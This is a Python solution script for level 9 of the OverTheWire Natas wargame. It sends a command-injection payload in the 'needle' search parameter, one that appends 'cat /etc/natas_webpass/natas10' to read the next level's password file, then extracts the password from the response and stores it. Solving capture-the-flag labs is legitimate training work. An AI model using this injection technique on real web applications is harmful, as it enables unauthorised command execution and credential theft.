import re, base64, requests, natas

USER='natas9'
PASSWORD=natas.get_credential(USER)

URL='http://natas9.natas.labs.overthewire.org'
QUERY='blabla dictionary.txt; cat /etc/natas_webpass/natas10; #'

def main():
    b64 = base64.b64encode('%s:%s' % (USER, PASSWORD))
    response = requests.get(
            URL,
            headers = {
                'Authorization':'Basic %s' % b64
            },
            params = {
                'needle':QUERY
            }
    )
    
    regex = r"<pre>\n(\w+)"
    matches = re.finditer(regex, response.content, re.MULTILINE)

    password = None
    for match in matches:
        password = match.group(1)

    if password is not None:
        print ('found password: %s' % password)
        print ('adding to credentials....')
        natas.save_credentials('natas10', password)
        print ('done')

if __name__ =='__main__':
    main()
